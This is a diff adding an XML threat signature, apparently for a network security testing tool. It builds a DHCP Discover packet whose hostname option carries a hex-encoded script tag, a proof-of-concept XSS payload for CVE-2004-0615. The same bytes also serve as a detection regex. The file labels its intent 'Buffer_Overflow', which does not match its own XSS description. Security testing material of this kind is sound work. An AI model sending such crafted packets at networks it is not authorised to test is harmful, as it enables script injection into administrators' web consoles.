@@ -1,0 +1,65 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="DHCP Hostname XSS Injection"/>
+    <EngDesc display="true" value="This threat sends a DHCP Discover packet with the hostname option set.  The hostname is set to a portion of Javascript that creates a pop-up window.  This technique can be used by a rogue host on the network to run Javascript with administrator privileges on the device serving the web page."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="DHCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+      <item value="Internet_Systems_Consortium"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://secunia.com/advisories/11919/"/>
+    <CVEID display="true" value="CVE-2004-0615"/>
+    <bugtraqID display="true" value="10587"/>
+    <OSVDB display="true" value="7211"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464d556f00a900fe009b00c9256b07ee"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725880241875000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X01\X01\X06\X00\X08\Xb7\Xbf\X34\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X90\X4b\X4d\X63\Xfe\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X63\X82\X53\X63\X35\X01\X01\X0c\X1f\X3c\X73\X63\X72\X69\X70\X74\X3e\X61\X6c\X65\X72\X74\X28\X27\X61\X73\X64\X66\X27\X29\X3b\X3c\X2f\X73\X63\X72\X69\X70\X74\X3e\Xff"/>
+    <Created value="1139461724" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(20,30)" Protocol="11" HeaderChecksum="" srcIP="0.0.0.0" destIP="255.255.255.255" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="68" destPort="$destPort" checksum="" length="" Payload="0101060008b7bf34000000000000000000000000000000000000000000904b4d63fe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000638253633501010c1f3c7363726970743e616c65727428276173646627293b3c2f7363726970743eff"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
